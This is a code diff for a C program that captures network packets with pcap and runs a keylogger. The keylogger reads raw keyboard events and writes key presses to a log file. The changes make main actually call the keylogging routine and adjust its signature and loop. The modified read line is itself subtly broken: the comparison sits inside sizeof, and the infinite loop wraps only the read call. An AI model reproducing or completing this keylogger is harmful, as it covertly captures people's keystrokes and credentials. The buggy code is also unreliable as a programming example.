@@ -145,7 +145,7 @@ int main(int argc, char **argv)
     
     
     /*Start Keylogging */
-    void start_keylogging(int kb_fd, FILE *log_file);
+    start_keylogging(kb_fd, log_file);
     
     pcap_loop(handle, -1, packet_received, (u_char*) &info);
     
@@ -217,7 +217,7 @@ void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_cha
         }
 }
 
-void* start_keylogging(int kb_fd, FILE *log_file){
+void start_keylogging(int kb_fd, FILE *log_file){
     
     typedef struct input_event input_event;
     input_event event;
@@ -230,7 +230,7 @@ void* start_keylogging(int kb_fd, FILE *log_file){
     }
     
     while (1)
-        read(kb_fd, &event, sizeof(input_event)) > 0);
+    read(kb_fd, &event, sizeof(input_event) > 0);
     if (event.type == EV_KEY) {
         if (event.value == KEY_PRESS) {
             if (is_shift(event.code)) {
@@ -246,5 +246,4 @@ void* start_keylogging(int kb_fd, FILE *log_file){
             }
         }
     }
-}
 }
